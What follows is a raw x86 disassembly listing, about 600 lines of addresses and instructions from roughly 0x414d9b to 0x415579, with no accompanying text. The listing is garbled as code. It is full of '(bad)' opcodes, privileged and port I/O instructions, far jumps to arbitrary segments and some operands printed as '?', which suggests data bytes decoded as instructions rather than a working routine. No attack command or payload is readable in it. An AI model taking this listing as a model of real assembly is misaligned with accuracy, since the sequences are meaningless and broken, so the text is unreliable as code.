  414d9b:	imul   ecx,ecx,0x6b
  414d9e:	arpl   WORD PTR [ebx-0x3f],bx
  414da1:	sahf   
  414da2:	outs   dx,BYTE PTR ds:[esi]
  414da3:	xchg   esp,eax
  414da4:	push   eax
  414da5:	popf   
  414da6:	sar    ebp,1
  414da8:	fwait
  414da9:	adc    dl,dl
  414dab:	cmp    dl,bh
  414dad:	pop    esi
  414dae:	fdivr  QWORD PTR [eax+eax*2-0x74]
  414db2:	jnp    0x414da0
  414db4:	mov    al,ds:0xd1644388
  414db9:	sub    BYTE PTR [esi],al
  414dbb:	and    dl,BYTE PTR [eax-0x56a94aee]
  414dc1:	dec    ebp
  414dc2:	jmp    0x40e:0xc40383b4
  414dc9:	(bad)  
  414dca:	nop
  414dcb:	mov    ds:0x56a10080,eax
  414dd0:	imul   ebx,DWORD PTR [esi],0xee1c0c22
  414dd6:	jl     0x414dbb
  414dd8:	mov    ah,0x77
  414dda:	mov    fs,esp
  414ddc:	outs   dx,BYTE PTR ds:[esi]
  414ddd:	inc    esp
  414dde:	jle    0x414e21
  414de0:	push   eax
  414de1:	fld    TBYTE PTR [esi-0x6c]
  414de4:	test   BYTE PTR [eax],cl
  414de6:	jp     0x414d82
  414de8:	push   esi
  414de9:	jp     0x414e32
  414deb:	loopne 0x414dad
  414ded:	rol    DWORD PTR [ebp-0x44eb70b7],cl
  414df3:	xchg   edi,eax
  414df4:	xlat   BYTE PTR ds:[ebx]
  414df5:	add    BYTE PTR [esi],al
  414df7:	xchg   DWORD PTR [ecx+eax*8+0x1d],esp
  414dfb:	repz adc BYTE PTR [edx+0x64739552],al
  414e02:	outs   dx,DWORD PTR ds:[esi]
  414e03:	into   
  414e04:	mov    al,0xde
  414e06:	mov    cl,0x50
  414e08:	mov    bh,0xa1
  414e0a:	sbb    eax,0xd66469a4
  414e0f:	nop
  414e10:	aad    0x12
  414e12:	xchg   edx,eax
  414e13:	inc    ebp
  414e14:	mov    ch,0x33
  414e16:	xchg   edx,eax
  414e17:	cwde   
  414e18:	and    al,0x8d
  414e1a:	xchg   ecx,eax
  414e1b:	cmp    dh,BYTE PTR [ebx-0x5]
  414e1e:	imul   edx,DWORD PTR [edi+0xa],0xfffffffa
  414e22:	mov    cl,0x46
  414e24:	mov    bh,0x5f
  414e26:	mov    ebp,0x62071937
  414e2b:	in     al,0xb9
  414e2d:	je     0x414db5
  414e2f:	fild   DWORD PTR [edx]
  414e31:	or     ebx,DWORD PTR [ebx+0x73]
  414e34:	push   ebp
  414e35:	(bad)  [edx+0x4c981032]
  414e3b:	jge    0x414e89
  414e3d:	sbb    eax,0x40a5cb39
  414e42:	out    dx,al
  414e43:	int    0x1e
  414e45:	push   ebp
  414e46:	mov    esp,0xece749d7
  414e4b:	js     0x414ea4
  414e4d:	add    ah,dl
  414e4f:	mov    edi,0xccf16f74
  414e54:	xlat   BYTE PTR ds:[ebx]
  414e55:	ja     0x414e2c
  414e57:	and    ecx,ebp
  414e59:	and    DWORD PTR [ecx+0xf48f5f0],esi
  414e5f:	add    eax,eax
  414e61:	das    
  414e62:	ja     0x414e7b
  414e64:	in     al,dx
  414e65:	outs   dx,BYTE PTR ds:[esi]
  414e66:	ret    0x93c5
  414e69:	jmp    0x414eca
  414e6b:	inc    esi
  414e6c:	fisttp WORD PTR [eax+ebx*1]
  414e6f:	and    DWORD PTR [eax-0xc],ecx
  414e72:	push   0xffffffc5
  414e74:	push   ebp
  414e75:	fcmovnb st,st(7)
  414e77:	popa   
  414e78:	mov    dh,0xe4
  414e7a:	jp     0x414ee0
  414e7c:	pushf  
  414e7d:	jnp    0x414e6e
  414e7f:	es (bad) 
  414e81:	add    dh,bl
  414e83:	shl    BYTE PTR [esi-0x28545b7f],1
  414e89:	in     al,dx
  414e8a:	out    0xa5,eax
  414e8c:	lahf   
  414e8d:	mov    ch,0xa9
  414e8f:	daa    
  414e90:	arpl   bp,di
  414e92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e93:	push   esi
  414e94:	into   
  414e95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e96:	and    bl,BYTE PTR [ebx+ebx*4-0x53]
  414e9a:	das    
  414e9b:	retf   
  414e9c:	xchg   DWORD PTR [esi+0x19],edi
  414e9f:	pop    ss
  414ea0:	pop    eax
  414ea1:	mov    edx,DWORD PTR [edx+0x71]
  414ea4:	inc    ebx
  414ea5:	and    al,0xdb
  414ea7:	inc    edx
  414ea8:	or     al,0xe7
  414eaa:	sbb    DWORD PTR [eax],ecx
  414eac:	push   0x59
  414eae:	imul   esp,DWORD PTR ds:0xa6eddaec,0x4c
  414eb5:	push   cs
  414eb6:	xor    cl,cl
  414eb8:	ret    
  414eb9:	test   BYTE PTR [ebx+ebx*2],bl
  414ebc:	sub    ch,BYTE PTR [edi-0x1b]
  414ebf:	(bad)  
  414ec0:	stc    
  414ec1:	mov    edx,DWORD PTR [ebx]
  414ec3:	xor    eax,DWORD PTR [eax+0x16]
  414ec6:	or     BYTE PTR [ebp-0xe],cl
  414ec9:	les    edx,FWORD PTR [edx]
  414ecb:	pop    edi
  414ecc:	adc    al,0xbc
  414ece:	adc    ch,ah
  414ed0:	sbb    eax,0xc9a3a0fe
  414ed5:	add    al,0x88
  414ed7:	mov    ds:0xd11d471a,al
  414edc:	inc    esp
  414edd:	mov    eax,0xb5416aa9
  414ee2:	cmp    eax,0x8cfbde17
  414ee7:	adc    al,0x3
  414ee9:	mov    al,ds:0x3909b0ed
  414eee:	pop    ds
  414eef:	cmp    al,0xb8
  414ef1:	call   0x9648ee17
  414ef6:	(bad)  
  414ef7:	call   0x6fdfc042
  414efc:	push   ecx
  414efd:	xchg   esp,eax
  414efe:	imul   edx,DWORD PTR [edi-0x55],0xc1d987aa
  414f05:	call   0x7ea21f66
  414f0a:	clc    
  414f0b:	jno    0x414f2f
  414f0d:	pop    edi
  414f0e:	mov    BYTE PTR [ecx-0x60],dl
  414f11:	push   DWORD PTR ds:0x6fd95c84
  414f17:	fsubr  QWORD PTR [ebx+edi*2-0x76]
  414f1b:	fcom   QWORD PTR [eax+eax*2+0x3cadb81a]
  414f22:	xchg   edi,eax
  414f23:	push   0xd8e55359
  414f28:	or     DWORD PTR [esp+edx*2],edi
  414f2b:	jge    0x414f21
  414f2d:	sar    BYTE PTR [ecx-0x5e8058c5],cl
  414f33:	data16 or BYTE PTR ss:[edi+0x69],ah
  414f38:	jb     0x414f1f
  414f3a:	lods   eax,DWORD PTR ds:[esi]
  414f3b:	mov    BYTE PTR [eax],cl
  414f3d:	ja     0x414f78
  414f3f:	fild   WORD PTR ds:0x3980242f
  414f45:	push   ecx
  414f46:	scas   eax,DWORD PTR es:[edi]
  414f47:	ror    DWORD PTR [ebx],0x85
  414f4a:	shl    DWORD PTR [ecx+edx*4+0xd],0x14
  414f4f:	mov    ch,0xc6
  414f51:	mov    ds:0x56cece0c,al
  414f56:	cdq    
  414f57:	add    al,0xaa
  414f59:	cmc    
  414f5a:	pop    esi
  414f5b:	xchg   esp,eax
  414f5c:	cmp    BYTE PTR [ebx-0x24],ah
  414f5f:	call   0x142b98fe
  414f64:	jmp    0xcab5:0x28068a0c
  414f6b:	sub    BYTE PTR [ecx+0xaf8c081],bl
  414f71:	dec    eax
  414f72:	outs   dx,BYTE PTR ds:[esi]
  414f73:	inc    eax
  414f74:	sbb    dh,al
  414f76:	cs dec ecx
  414f78:	xchg   DWORD PTR [ecx],ecx
  414f7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f7b:	push   0x1b1378db
  414f80:	cmp    ecx,DWORD PTR ds:0x29d247c5
  414f86:	popf   
  414f87:	adc    BYTE PTR [eax+0x38],dl
  414f8a:	gs inc ecx
  414f8c:	jmp    0x414f1b
  414f8e:	push   cs
  414f8f:	xchg   ebp,eax
  414f90:	sub    edx,ebx
  414f92:	pop    esi
  414f93:	stos   BYTE PTR es:[edi],al
  414f94:	push   ebx
  414f95:	lahf   
  414f96:	dec    esi
  414f97:	loop   0x414f97
  414f99:	mov    ebp,0xff7106c4
  414f9e:	(bad)
  414fa1:	mov    DWORD PTR [edx-0x2b72958b],ecx
  414fa7:	aam    0x73
  414fa9:	pushf  
  414faa:	aad    0x2
  414fac:	jl     0x414f5f
  414fae:	xchg   esi,eax
  414faf:	out    dx,eax
  414fb0:	pop    ds
  414fb1:	mov    eax,?
  414fb3:	xor    ebx,DWORD PTR [eax+eax*4-0x28]
  414fb7:	(bad)  
  414fb8:	iret   
  414fb9:	xchg   edi,eax
  414fba:	xchg   edi,eax
  414fbb:	mov    dh,BYTE PTR [esi]
  414fbd:	dec    ecx
  414fbe:	xchg   esi,eax
  414fbf:	pop    ebp
  414fc0:	push   esi
  414fc1:	mov    dl,0x18
  414fc3:	mov    al,0x53
  414fc5:	push   esp
  414fc6:	push   ds
  414fc7:	adc    DWORD PTR [ebp-0x7cee3675],edx
  414fcd:	(bad)  
  414fce:	bound  ecx,QWORD PTR [edx+0x6ee04930]
  414fd4:	aas    
  414fd5:	repz or ebp,ebx
  414fd8:	mov    ch,0xa3
  414fda:	xchg   ebp,eax
  414fdb:	and    esi,DWORD PTR [ebx-0x1bf997dd]
  414fe1:	retf   
  414fe2:	fiadd  DWORD PTR [bp+di]
  414fe5:	dec    eax
  414fe6:	add    ah,dh
  414fe8:	sub    DWORD PTR [edx+0x3d8c4f77],0x8b0112c2
  414ff2:	sub    al,0xaa
  414ff4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ff5:	mov    bl,0x8e
  414ff7:	jmp    0x414f94
  414ff9:	add    al,al
  414ffb:	mov    esi,0x384b1059
  415000:	test   DWORD PTR [ebp+0x2ebdeba2],esi
  415006:	test   al,0xce
  415008:	imul   edx,esp,0x52
  41500b:	dec    edi
  41500c:	inc    esp
  41500d:	lds    ebx,FWORD PTR [edi-0x49b85ee0]
  415013:	cmp    ch,BYTE PTR ds:0xc0545cde
  415019:	stc    
  41501a:	xor    DWORD PTR [ecx-0x64],ecx
  41501d:	mov    esi,0x78ab13cb
  415022:	mov    ecx,0xe10a2df5
  415027:	adc    eax,0x4f1327d6
  41502c:	fcom   QWORD PTR [edx-0x70]
  41502f:	popf   
  415030:	add    eax,0x494df481
  415035:	dec    esp
  415036:	js     0x41505d
  415038:	sti    
  415039:	pop    eax
  41503a:	je     0x414fd9
  41503c:	dec    ebp
  41503d:	pop    esi
  41503e:	mov    ds:0x6af98c99,eax
  415043:	in     eax,dx
  415044:	push   cs
  415045:	push   0xfeec136
  41504a:	gs and al,0x4e
  41504d:	adc    BYTE PTR [eax-0x8],bl
  415050:	cli    
  415051:	(bad)  
  415052:	icebp  
  415053:	fsqrt  
  415055:	mov    DWORD PTR [edi],esp
  415057:	inc    eax
  415058:	jecxz  0x4150b7
  41505a:	xchg   DWORD PTR [edi],eax
  41505c:	rcr    bh,cl
  41505e:	test   al,0x57
  415060:	xchg   edx,eax
  415061:	dec    edx
  415062:	test   bh,cl
  415064:	jb     0x41500b
  415066:	shl    ecx,0x13
  415069:	xor    bh,dh
  41506b:	xor    DWORD PTR [edi-0x68819f8e],esi
  415071:	mov    ds:0x2e4cb3f8,eax
  415076:	mov    esp,0xefc45322
  41507b:	fwait
  41507c:	push   esp
  41507d:	icebp  
  41507e:	rol    BYTE PTR [edx],1
  415080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415081:	test   DWORD PTR [edx-0x53],0x301cf55d
  415088:	xchg   ebp,eax
  415089:	mov    dl,0x84
  41508b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41508c:	pop    eax
  41508d:	pop    esp
  41508e:	add    edx,eax
  415090:	pusha  
  415091:	mov    ?,WORD PTR [eax+0x2d]
  415094:	push   edi
  415095:	or     dl,dl
  415097:	(bad)  
  415098:	mov    edx,DWORD PTR [ecx-0x3b]
  41509b:	pop    edx
  41509c:	inc    eax
  41509d:	ficom  WORD PTR [ebx+0x57d8b279]
  4150a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150a4:	je     0x41504f
  4150a6:	mov    al,ds:0x1c6333e7
  4150ab:	cld    
  4150ac:	add    al,0xc
  4150ae:	push   edx
  4150af:	dec    esp
  4150b0:	mov    dh,BYTE PTR [eax-0xa]
  4150b3:	aas    
  4150b4:	rol    DWORD PTR [ecx],0x2b
  4150b7:	dec    ebx
  4150b8:	jmp    0x4150ba
  4150ba:	test   DWORD PTR ds:0xd78947b9,ebx
  4150c0:	mov    al,0x6
  4150c2:	out    0x6c,al
  4150c4:	pop    ebx
  4150c5:	cmp    al,0x92
  4150c7:	pop    eax
  4150c8:	jge    0x415061
  4150ca:	test   DWORD PTR [ecx+0x487bee21],esp
  4150d0:	jbe    0x415135
  4150d2:	cli    
  4150d3:	lock popf 
  4150d5:	and    DWORD PTR [esi+0x5ef54793],esp
  4150db:	cmc    
  4150dc:	loope  0x4150cb
  4150de:	fisttp QWORD PTR [ecx+ebp*1-0x54]
  4150e2:	xchg   esp,eax
  4150e3:	ret    0xaf0
  4150e6:	fmul   DWORD PTR [ebx+ecx*2+0x38]
  4150ea:	xchg   edx,eax
  4150eb:	call   DWORD PTR [edi+0x43c90dfb]
  4150f1:	sub    al,0x56
  4150f3:	mov    ebp,0x40611194
  4150f8:	or     esp,DWORD PTR [edx+0x6a]
  4150fb:	aaa    
  4150fc:	push   ebx
  4150fd:	cwde   
  4150fe:	in     eax,dx
  4150ff:	out    dx,eax
  415100:	ss sbb al,0x74
  415103:	jno    0x415088
  415105:	mov    dl,0xb3
  415107:	mov    esp,0xdea0e598
  41510c:	pushf  
  41510d:	add    al,0xb9
  41510f:	xchg   ebx,eax
  415110:	mov    al,0x2a
  415112:	push   esp
  415113:	nop
  415114:	dec    esp
  415115:	push   esi
  415116:	push   eax
  415117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415118:	dec    edi
  415119:	mov    cl,0xa2
  41511b:	jae    0x41509f
  41511d:	fwait
  41511e:	gs hlt 
  415120:	outs   dx,BYTE PTR ds:[esi]
  415121:	call   0xe71f20a0
  415126:	xor    BYTE PTR [eax],al
  415128:	pop    ebp
  415129:	rol    BYTE PTR [ebx],1
  41512b:	or     ebp,esp
  41512d:	mov    esi,0x2e121750
  415132:	jns    0x415145
  415134:	sahf   
  415135:	(bad)  
  415136:	in     eax,dx
  415137:	push   ebp
  415138:	loop   0x4151b7
  41513a:	or     ecx,DWORD PTR [edx-0x3e]
  41513d:	ret    0xb79
  415140:	jl     0x415190
  415142:	sub    BYTE PTR [ebp+0x422aa8bb],dh
  415148:	out    dx,eax
  415149:	shr    BYTE PTR [ecx],1
  41514b:	add    al,0x0
  41514d:	imul   edi,DWORD PTR ds:0xe5b8e930,0x728cafd4
  415157:	clc    
  415158:	push   0x6e8220cf
  41515d:	xsavec [ecx+0x40]
  415161:	xlat   BYTE PTR ds:[ebx]
  415162:	retf   0x8457
  415165:	lock mov dh,dh
  415168:	mov    eax,ds:0xafba3c2a
  41516d:	ins    BYTE PTR es:[edi],dx
  41516e:	aad    0x7a
  415170:	cmp    ebx,edx
  415172:	mov    eax,0x16743d36
  415177:	adc    al,0x86
  415179:	sub    BYTE PTR ds:0xf970f777,dh
  41517f:	aaa    
  415180:	adc    DWORD PTR [ebx+0x53],ebp
  415183:	rcr    DWORD PTR [ebx+esi*2-0x62],1
  415187:	pushf  
  415188:	and    BYTE PTR [edi-0x63],ch
  41518b:	jle    0x41518d
  41518d:	dec    esi
  41518e:	xor    BYTE PTR [edx+0x19],bh
  415191:	jmp    0x2ad9:0xd7559c94
  415198:	call   0xd6d5:0x141e938e
  41519f:	sahf   
  4151a0:	test   eax,0x78806a3d
  4151a5:	dec    eax
  4151a6:	scas   al,BYTE PTR es:[edi]
  4151a7:	jmp    0x4151b7
  4151a9:	adc    al,0x36
  4151ab:	hlt    
  4151ac:	xchg   edx,eax
  4151ad:	rol    BYTE PTR [esi+0x3c86e91b],1
  4151b3:	sti    
  4151b4:	xchg   ebp,eax
  4151b5:	push   ss
  4151b6:	xchg   esp,eax
  4151b7:	jl     0x41514e
  4151b9:	daa    
  4151ba:	xor    eax,0xa584ed80
  4151bf:	adc    al,0xe5
  4151c1:	ret    
  4151c2:	mov    esi,0xecba12dc
  4151c7:	shr    ebx,0xdc
  4151ca:	xchg   esp,eax
  4151cb:	outs   dx,DWORD PTR ds:[esi]
  4151cc:	and    DWORD PTR [edi-0x5ce2c327],edi
  4151d2:	rol    DWORD PTR [edi],1
  4151d4:	ret    
  4151d5:	push   ebp
  4151d6:	outs   dx,BYTE PTR ds:[esi]
  4151d7:	cmp    dl,0x99
  4151da:	repz loop 0x4151da
  4151dd:	push   esp
  4151de:	fldcw  WORD PTR [ebp+0x79]
  4151e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151e2:	shl    BYTE PTR [ebx+0x24451310],cl
  4151e8:	inc    edx
  4151e9:	(bad)  
  4151ea:	mov    cl,0x84
  4151ec:	sar    BYTE PTR [edi+0x14247f21],0x16
  4151f3:	sub    al,0x6
  4151f5:	call   0x4caa:0xe2dd720d
  4151fc:	jecxz  0x415237
  4151fe:	mov    al,0x5f
  415200:	lahf   
  415201:	test   BYTE PTR [ebx+0x3353940d],al
  415207:	or     BYTE PTR [ebx+0x39],0x6d
  41520b:	inc    esp
  41520c:	sbb    bh,BYTE PTR [edi]
  41520e:	pop    ecx
  41520f:	sub    cl,dl
  415211:	inc    edi
  415212:	in     eax,0x51
  415214:	pop    DWORD PTR [edi-0x4a8d49bc]
  41521a:	call   0x5adb:0x7353b4bf
  415221:	mov    ebx,0x72fd3c97
  415226:	bound  eax,QWORD PTR [ecx]
  415228:	mov    al,ds:0x545e878e
  41522d:	jnp    0x415279
  41522f:	test   ah,0xa4
  415232:	stos   BYTE PTR es:[edi],al
  415233:	pop    ebp
  415234:	enter  0x1135,0x99
  415238:	cwde   
  415239:	add    ecx,DWORD PTR [eax+0x65b9d9b]
  41523f:	jle    0x41526b
  415241:	xor    esi,0xffffffc0
  415244:	dec    esi
  415245:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415246:	mov    eax,0xe9917cc4
  41524b:	ins    DWORD PTR es:[edi],dx
  41524c:	int    0x16
  41524e:	js     0x41529e
  415250:	inc    eax
  415251:	xchg   ebx,eax
  415252:	mov    ebp,0x6f90b312
  415257:	xor    ecx,DWORD PTR [ebp-0x63afe12e]
  41525d:	fld    QWORD PTR [edx+0x14]
  415261:	mov    esp,0xd94fad4f
  415266:	xor    esp,esi
  415268:	xchg   DWORD PTR [ebp+edi*2+0x23],ebx
  41526c:	mov    ch,0x18
  41526e:	mov    BYTE PTR [eax-0x34],dh
  415271:	test   al,0x44
  415273:	and    al,0x12
  415275:	push   eax
  415276:	jl     0x4152b8
  415278:	stos   DWORD PTR es:[edi],eax
  415279:	inc    esi
  41527a:	retf   
  41527b:	pushf  
  41527c:	mov    ebp,0x98991d81
  415281:	mov    ch,0x23
  415283:	sbb    dl,ch
  415285:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415286:	popf   
  415287:	mov    esi,0x37917027
  41528c:	loope  0x415288
  41528e:	push   ebx
  41528f:	and    eax,0x844f85da
  415294:	in     al,dx
  415295:	jl     0x4152f4
  415297:	fisubr WORD PTR [ecx+0xf]
  41529a:	leave  
  41529b:	sub    ebp,DWORD PTR [ebx+edx*8-0x1e]
  41529f:	mov    BYTE PTR [edx+esi*8],bh
  4152a2:	sar    DWORD PTR [ecx+0x4d38249b],cl
  4152a8:	jns    0x4152c4
  4152aa:	icebp  
  4152ab:	cli    
  4152ac:	pop    esp
  4152ad:	bound  ebx,QWORD PTR [edx]
  4152af:	cmp    ebx,ebp
  4152b1:	mov    ds:0x504a7f4,eax
  4152b6:	sbb    al,0xc7
  4152b9:	and    eax,0x82dfc6cb
  4152be:	rcr    BYTE PTR [esp+eax*4-0x36e1595b],0xd
  4152c6:	inc    ebx
  4152c7:	or     bh,cl
  4152c9:	add    BYTE PTR [ecx+eiz*2+0x6b06c028],bh
  4152d0:	sub    ecx,ebx
  4152d2:	mov    ebp,0xe56ab498
  4152d7:	cmp    al,0x4d
  4152d9:	mov    ah,0xe7
  4152db:	sbb    al,0x7d
  4152dd:	fistp  QWORD PTR [ecx+0x634d0781]
  4152e3:	jmp    DWORD PTR [ebp-0x53a70270]
  4152e9:	jmp    0x415304
  4152eb:	mov    bh,0x44
  4152ed:	push   esi
  4152ee:	mov    ecx,0x8ab3af8
  4152f3:	push   esp
  4152f4:	(bad)  
  4152f5:	lea    esi,[ecx+0x13]
  4152f8:	mov    ecx,0x381c9ba5
  4152fd:	scas   al,BYTE PTR es:[edi]
  4152fe:	mov    WORD PTR [ecx-0x5d],?
  415301:	fwait
  415302:	add    dl,BYTE PTR [esi]
  415304:	mov    bl,0x21
  415306:	inc    esi
  415307:	pop    edi
  415308:	mov    al,ds:0xf8e236f3
  41530d:	mov    dl,0x8b
  41530f:	or     al,0xe6
  415311:	inc    esi
  415312:	in     al,dx
  415313:	inc    edx
  415314:	push   ds
  415315:	test   al,0xba
  415317:	pop    eax
  415318:	js     0x415371
  41531a:	lock jmp FWORD PTR [esp+eax*1-0x8994b22]
  415322:	mov    al,ds:0x5e06e06f
  415327:	data16 cld 
  415329:	fistp  DWORD PTR [esp+ebp*2]
  41532c:	lds    edi,FWORD PTR [eax-0x21]
  41532f:	jecxz  0x4152db
  415331:	icebp  
  415332:	push   ebx
  415333:	jo     0x415329
  415335:	cld    
  415336:	aas    
  415337:	cwde   
  415338:	rcr    BYTE PTR [ebx+0x13],0xcb
  41533c:	push   0xccf3b26c
  415341:	aad    0xbf
  415343:	daa    
  415344:	jns    0x415383
  415346:	push   eax
  415347:	sub    eax,0x803c7cf
  41534c:	retf   
  41534d:	xor    dl,BYTE PTR [ecx+ebx*2+0x75]
  415351:	loop   0x41530a
  415353:	pop    edi
  415354:	js     0x41536a
  415356:	(bad)  
  415357:	fisubr DWORD PTR [eax]
  415359:	cli    
  41535a:	test   edi,ebp
  41535c:	jbe    0x415323
  41535e:	test   al,0xde
  415360:	test   al,0xc6
  415362:	xchg   edx,eax
  415363:	mov    ah,0x18
  415365:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415366:	inc    edx
  415367:	and    BYTE PTR [ebp-0x45],0xc4
  41536b:	add    ecx,DWORD PTR [ecx+0x4aae11e0]
  415371:	dec    ebp
  415372:	lahf   
  415373:	xchg   esp,eax
  415374:	es das 
  415376:	outs   dx,DWORD PTR ds:[esi]
  415377:	lds    edx,FWORD PTR [eax+0xb]
  41537a:	mov    bl,0xfb
  41537c:	and    al,0x98
  41537e:	in     eax,0xb0
  415380:	jg     0x415345
  415382:	inc    ebp
  415383:	ins    DWORD PTR es:[edi],dx
  415384:	xchg   edi,eax
  415385:	mov    ch,BYTE PTR [edi]
  415387:	push   eax
  415388:	rcr    esi,1
  41538a:	and    edx,DWORD PTR [esp+ebp*2-0x9392378]
  415391:	cmp    BYTE PTR [edi+0x39bf8b39],ah
  415397:	push   cs
  415398:	mov    DWORD PTR ds:0x14649a65,0xa8dfa5d2
  4153a2:	dec    esi
  4153a3:	loope  0x41536b
  4153a5:	mov    BYTE PTR [ebp+0x48],bh
  4153a8:	push   edi
  4153a9:	(bad)
  4153ae:	shr    DWORD PTR ds:0x49054de3,1
  4153b4:	pop    ecx
  4153b5:	add    BYTE PTR [ecx-0x2dfd0213],dh
  4153bb:	push   edi
  4153bc:	retf   0xf90e
  4153bf:	xor    ch,BYTE PTR [ecx+edi*4]
  4153c2:	push   ss
  4153c3:	xor    eax,0xa242bcc6
  4153c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153c9:	pop    eax
  4153ca:	xchg   ebp,eax
  4153cb:	pop    es
  4153cc:	fnsave [ebp+ebp*2-0x29]
  4153d0:	retf   0x738f
  4153d3:	pop    eax
  4153d4:	popf   
  4153d5:	inc    esp
  4153d6:	mov    es,WORD PTR [esp+ebx*2-0x447d1016]
  4153dd:	inc    esi
  4153de:	cld    
  4153df:	mov    edi,?
  4153e1:	lds    esp,FWORD PTR [edx]
  4153e3:	loopne 0x415396
  4153e5:	add    eax,0xc2276830
  4153ea:	(bad)  
  4153eb:	js     0x415463
  4153ed:	push   ebp
  4153ee:	repz jge 0x415429
  4153f1:	xor    edi,esp
  4153f3:	ins    DWORD PTR es:[edi],dx
  4153f4:	(bad)  
  4153f6:	(bad)
  4153fa:	and    al,BYTE PTR [edx]
  4153fc:	push   ds
  4153fd:	mov    dl,0x4b
  4153ff:	not    dl
  415401:	xchg   esp,eax
  415402:	cld    
  415403:	les    edx,FWORD PTR [ecx]
  415405:	fcmove st,st(5)
  415407:	arpl   WORD PTR [edi-0x63],bp
  41540a:	ret    
  41540b:	pusha  
  41540c:	aam    0xa8
  41540e:	fdiv   QWORD PTR [ebx+eax*4-0x3e6a8110]
  415415:	in     eax,dx
  415416:	xchg   ebx,eax
  415417:	sub    BYTE PTR [ecx+0x6630826],dl
  41541d:	aaa    
  41541e:	loop   0x41542a
  415420:	shr    BYTE PTR [ebx+0x74d0d4a],0xe0
  415427:	and    eax,0x3a189dbf
  41542c:	out    dx,eax
  41542d:	imul   edx,DWORD PTR ds:0xaabfe5ca,0x7f9ff598
  415437:	das    
  415438:	jnp    0x41545b
  41543a:	outs   dx,BYTE PTR ds:[esi]
  41543b:	jmp    0xc150e97a
  415440:	fwait
  415441:	test   eax,0xafafa606
  415446:	sti    
  415447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415448:	ret    
  415449:	test   BYTE PTR [ebx-0x65e49564],ch
  41544f:	jmp    0x5d21:0x8776245b
  415456:	not    DWORD PTR [ecx+0x88d04f5]
  41545c:	je     0x415460
  41545e:	or     DWORD PTR [edi],ebx
  415460:	in     al,dx
  415461:	mov    ah,0xec
  415463:	jnp    0x415455
  415465:	pop    esi
  415466:	gs jmp 0x33b5:0x1877d9a6
  41546e:	push   cs
  41546f:	ja     0x415485
  415471:	cmp    cl,bh
  415473:	jne    0x41545c
  415475:	jmp    0x4154e2
  415477:	jmp    0x41541d
  415479:	jmp    0x4154f1
  41547b:	mov    ebx,0x5af3ca3c
  415480:	stos   DWORD PTR es:[edi],eax
  415481:	cdq    
  415482:	xchg   esi,eax
  415483:	fild   DWORD PTR [esi+0x57375ced]
  415489:	rol    eax,cl
  41548b:	push   0x7d
  41548d:	lahf   
  41548e:	bound  esp,QWORD PTR [edi+0x55]
  415491:	div    DWORD PTR [edi-0x50443cb]
  415497:	add    eax,0x25ba0213
  41549c:	icebp  
  41549d:	mov    ds:0x15567ac8,al
  4154a2:	sbb    BYTE PTR [edi-0x4a],ah
  4154a5:	mov    esp,0xb3b63fe7
  4154aa:	bnd jg 0x415529
  4154ad:	mov    eax,ds:0xa7acaf1a
  4154b2:	rcl    BYTE PTR [esi-0x53],0xb6
  4154b6:	emms   
  4154b8:	popf   
  4154b9:	add    DWORD PTR [eax+0x62],eax
  4154bc:	ss arpl bp,si
  4154bf:	mov    ebx,0x7e579c18
  4154c4:	dec    esi
  4154c5:	ins    BYTE PTR es:[edi],dx
  4154c6:	out    dx,al
  4154c7:	out    0xc0,al
  4154c9:	jl     0x41545d
  4154cb:	mov    ch,0x88
  4154cd:	jno    0x415469
  4154cf:	repnz imul ecx,DWORD PTR [ecx+edi*4+0x58],0x841d4b86
  4154d8:	xchg   esp,eax
  4154d9:	ins    DWORD PTR es:[edi],dx
  4154da:	sub    ch,BYTE PTR [edx+eax*4-0x64]
  4154de:	add    bl,BYTE PTR [ebp-0x4d18a083]
  4154e4:	sar    DWORD PTR [ebx],cl
  4154e6:	jg     0x4154ee
  4154e8:	sbb    al,0xcf
  4154ea:	mov    esp,0xf0ae19b7
  4154ef:	aam    0x9d
  4154f1:	cmp    BYTE PTR [ebx-0x228dbc87],dh
  4154f7:	out    0xcf,eax
  4154f9:	cmp    bl,BYTE PTR [esi+0x7a2a578]
  4154ff:	and    al,0xd
  415501:	adc    DWORD PTR [eax-0x72],ebx
  415504:	adc    DWORD PTR [esi-0x36ee6c5a],esp
  41550a:	inc    ebp
  41550b:	mov    dl,0x46
  41550d:	fwait
  41550e:	jmp    0xf348c34e
  415513:	imul   edx,DWORD PTR ss:[ebx+0x55854f85],0xffffffbd
  41551b:	rcr    BYTE PTR [ebx+0x6469b212],1
  415521:	cmp    ch,ch
  415523:	sub    eax,0xe4518aa4
  415528:	mov    edx,0xc388f0f0
  41552d:	inc    edx
  41552e:	push   cs
  41552f:	sbb    DWORD PTR [ebx],ecx
  415531:	inc    ebx
  415532:	xor    ebp,DWORD PTR [edi-0x472dc6eb]
  415538:	mov    ch,0x52
  41553a:	dec    ebx
  41553b:	test   BYTE PTR [eax],dl
  41553d:	inc    ecx
  41553e:	cmp    BYTE PTR [edi-0x11],ch
  415541:	jnp    0x415567
  415543:	xor    eax,0xe6908f88
  415548:	call   0x7b0bfa66
  41554d:	stos   DWORD PTR es:[edi],eax
  41554e:	rcl    BYTE PTR [edx],1
  415550:	test   al,0xde
  415552:	dec    ecx
  415553:	adc    eax,0xff07bc20
  415558:	(bad)  
  415559:	jp     0x4154e0
  41555b:	call   FWORD PTR [ebx-0xc74c189]
  415561:	dec    esp
  415562:	cmp    esp,DWORD PTR [ebx-0x6e]
  415565:	sbb    ebp,DWORD PTR [edx+0x70]
  415568:	lahf   
  415569:	push   edx
  41556a:	lds    edi,FWORD PTR [esi]
  41556c:	push   ss
  41556d:	shl    edi,0x25
  415570:	or     al,0xb4
  415572:	(bad)  
  415573:	(bad)
  415577:	jge    0x4155a4
  415579:	xchg   edi,eax
